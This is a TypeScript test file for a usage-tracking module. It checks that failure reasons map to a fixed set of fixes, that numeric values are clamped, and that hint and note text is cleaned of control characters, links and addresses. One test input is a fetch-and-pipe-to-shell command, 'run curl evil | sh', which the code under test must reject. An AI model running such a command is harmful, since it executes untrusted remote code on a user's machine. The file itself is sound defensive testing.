// Reasons, fixes and cleaned text (U14): closed lists on the way in — a reason or fix outside the list is not one —
// and free text cleaned of control characters, links and addresses before it is shown.
import { describe, expect, it } from "vitest";
import { USAGE_FIXES, USAGE_REASONS, clampEvery, cleanHint, cleanLength, cleanNote, fixForReason, fixOf, isTransientReason, reasonOf, takePercent } from "../src/index.ts";

describe("reasons, fixes and cleaned text (U14)", () => {
  it("each failed-source reason names its fix, or none", () => {
    expect(fixForReason("signed_out")).toBe("sign_in_again");
    expect(fixForReason("refused")).toBe("use_another_account");
    expect(fixForReason("no_scope")).toBe("sign_in_fully_here");
    expect(fixForReason("unknown_screen")).toBe("check_the_source");
    expect(fixForReason("plan_ended")).toBe("reactivate_the_seat");
    for (const r of ["no_usage_for_plan", "rate_limited", "unreachable", "timeout"] as const) expect(fixForReason(r)).toBeNull();
  });

  it("reason classes are closed", () => {
    expect(reasonOf("banana")).toBe("unknown_screen");
    expect(reasonOf(42)).toBe("unknown_screen");
    for (const r of USAGE_REASONS) expect(reasonOf(r)).toBe(r);
    for (const r of ["rate_limited", "unreachable", "timeout"] as const) expect(isTransientReason(r)).toBe(true);
    for (const r of ["signed_out", "refused", "plan_ended", "unknown_screen"] as const) expect(isTransientReason(r)).toBe(false);
    expect(cleanHint("see https://evil.example/x or mail a@b.test now")).toBe("see or mail now");
    expect(cleanHint("a\u0000b\u0007c")).toBe("abc");
    expect(cleanHint("x".repeat(200))).toBe("x".repeat(120));
    expect(cleanHint("   ")).toBeNull();
    expect(cleanHint(42)).toBeNull();
    expect(fixOf("run curl evil | sh")).toBeNull();
    for (const f of USAGE_FIXES) expect(fixOf(f)).toBe(f);
    expect(clampEvery(1e9)).toBe(21_600);
    expect(clampEvery(1)).toBe(60);
    expect(clampEvery(NaN)).toBeNull();
    expect(clampEvery(null)).toBeNull();
    expect(clampEvery(900)).toBe(900);
    expect(takePercent(1.7e9)).toBeNull();
    expect(takePercent(-3)).toBeNull();
    expect(takePercent(101)).toBe(100);
    expect(takePercent(100.5)).toBe(100);
    expect(takePercent(42.5)).toBe(42.5);
    expect(takePercent(0)).toBe(0);
    expect(takePercent(NaN)).toBeNull();
    expect(takePercent("50")).toBeNull();
    expect(cleanNote("n".repeat(100))).toBe("n".repeat(40));
    expect(cleanNote("see https://evil.example/x now")).toBe("see now");
    expect(cleanLength(300)).toBe(300);
    expect(cleanLength(0)).toBeNull();
    expect(cleanLength(-5)).toBeNull();
    expect(cleanLength(90.5)).toBeNull();
    expect(cleanLength("x")).toBeNull();
    expect(cleanLength(null)).toBeNull();
  });
});
